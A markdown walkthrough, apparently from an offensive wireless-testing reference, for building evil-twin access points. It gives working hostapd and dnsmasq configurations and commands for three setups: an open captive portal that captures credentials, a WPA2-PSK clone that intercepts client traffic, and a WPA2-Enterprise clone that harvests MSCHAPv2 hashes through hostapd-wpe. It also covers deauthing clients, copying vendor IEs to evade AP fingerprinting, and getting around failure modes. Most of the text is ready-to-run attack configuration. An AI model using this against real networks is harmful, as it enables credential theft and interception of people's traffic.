# Evil twin — walkthrough

Two modes: match the RF, or match the RF *and* the association handshake.
The first is enough for cred-capture via captive portal. The second is
what you need when the target's supplicant validates the PMK against
its stored profile.

## Preconditions

- Target AP identified: SSID, BSSID, channel, security posture (RSN IE).
- Pineapple with hostapd (or hostapd-mana / hostapd-wpe for variants).
- Optional: matching Vendor-IE signature if the target's supplicant
  fingerprints APs.

## Path A — Open / captive-portal evil twin (WCTF classic)

```
cat > /tmp/twin.conf <<EOF
interface=wlan1
driver=nl80211
ssid=CorporateGuest
bssid=aa:bb:cc:dd:ee:ff        # clone of target
hw_mode=g
channel=6
ignore_broadcast_ssid=0
auth_algs=1
# no wpa= line — open network
EOF
hostapd /tmp/twin.conf &

# DHCP + DNS via dnsmasq (or the Pineapple's built-in stack)
cat > /tmp/dnsmasq.conf <<EOF
interface=wlan1
dhcp-range=172.16.42.10,172.16.42.250,12h
dhcp-option=6,172.16.42.1     # DNS = us
address=/#/172.16.42.1        # every hostname resolves to us
EOF
dnsmasq -C /tmp/dnsmasq.conf

# Then bring up the captive-portal HTTP server (evil-portal module
# or nginx with a login template).
```

Point clients at your rogue by:

1. Broadcast deauth off the real AP (if not PMF-required).
2. Match your rogue on RSSI (Pineapple's second antenna helps).
3. Karma / probe response so any probing client sees "their" SSID.
   See `pineap/walkthrough.md`.

## Path B — WPA2-PSK evil twin (need the PSK)

```
cat > /tmp/twin.conf <<EOF
interface=wlan1
driver=nl80211
ssid=CorpWiFi
bssid=aa:bb:cc:dd:ee:ff
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=<the-known-PSK>
ieee80211w=0                  # match target: 0 for legacy, 1 optional, 2 required
EOF
hostapd /tmp/twin.conf
```

Once a client associates, its traffic transits you. Also useful for
validating a *candidate* PSK — a wrong passphrase yields a 4-way M2
that never completes (KCK MIC fails).

## Path C — WPA2-Enterprise evil twin (harvest EAP)

For enterprise, the AP-side is the *authenticator*, not the auth
server. Point hostapd at a local hostapd-wpe or freeradius-wpe.

```
cat > /tmp/twin.conf <<EOF
interface=wlan1
ssid=CorporateEAP
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=whocares
EOF
# Then run hostapd-wpe alongside — it logs MSCHAPv2 chal/resp pairs.
```

See `hostapd-wpe/reference.md` and `eaphammer/reference.md` for the
higher-level orchestrators.

## Vendor-IE matching (when the twin is spotted)

Some 2024+ enterprise supplicants fingerprint APs on Vendor-IE order.
Match:

```
# In hostapd — extract from a legitimate beacon capture:
tshark -r legit.pcapng -Y "wlan.fc.type_subtype == 8" -c 1 \
       -T fields -e wlan.tag.oui -e wlan.tag.number

# Then in hostapd.conf, use vendor_elements= to inject matching bytes:
vendor_elements=dd0900037f01010000ff7f
```

## Failure modes

- **PMF-required + no downgrade.** Deauth can't push clients. Rely on
  RSSI and natural roams.
- **BSSID collision detected by driver.** Some driver stacks refuse to
  bring up an AP with a BSSID they can already hear. Move to a
  different channel, or clone a BSSID that differs by one bit.
- **Client sees the mismatch and refuses.** Cert pinning, MDM
  profile, or Vendor-IE fingerprint mismatch. Path C with a matching
  cert or Vendor-IE payload.

## Cite

- hostapd configuration reference (w1.fi).
- SensePost 2014 — MANA.
- attacks.json: `evil-twin-clone`, `captive-portal-cred-capture`.
